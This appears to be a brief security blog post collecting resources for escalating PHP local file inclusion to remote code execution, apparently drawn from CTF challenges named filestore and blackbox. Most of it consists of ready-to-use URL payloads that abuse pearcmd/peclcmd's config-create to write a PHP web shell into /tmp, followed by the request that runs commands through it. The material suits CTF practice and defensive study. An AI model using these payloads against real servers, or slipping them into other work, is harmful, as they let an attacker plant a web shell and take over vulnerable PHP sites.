---
layout: mypost
title: Escalating LFI to RCE with php - Resources 
categories: [web]
---

## Resources

[https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

[https://github.com/TCP1P/TCP1P_CTF_writeup/blob/main/2023/angstromctf-2023/README.md#exploitation](https://github.com/TCP1P/TCP1P_CTF_writeup/blob/main/2023/angstromctf-2023/README.md#exploitation) (a writeup for filestore, a CTF challenge about exploiting LFI for RCE)

`/?+config-create+/&f=.././.././.././.././../usr/local/lib/./php/peclcmd.php&/<?=system($_GET['cmd']);?>+/tmp/lol.php` (an alternative payload for filestore using `peclcmd`)

[https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/](https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/) (a collection of lfi techniques)

[https://blog.csdn.net/rfrder/article/details/121042290](https://blog.csdn.net/rfrder/article/details/121042290) (an in depth explanation of exploiting pearcmd.php)

`/?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?=phpinfo()?>+/tmp/test1235.php`(a working payload for blackbox, another CTF challenge)

## Clean pearcmd/peclcmd Payload:

```
/?page=/usr/local/lib/php/pearcmd&+config-create+/<?=SYSTEM($_GET['cmd']);?>+/tmp/webshell.php
``` 

Note that the `/` behind the webshell `<?=SYSTEM($_GET['cmd']);?>` is necessary because config-create is utting the value as a root directory for some config options. `/tmp/webshell.php` is the config file we're writing to.

After we create the shell, we use `/?page=/tmp/webshell&cmd=ls` for command execution.
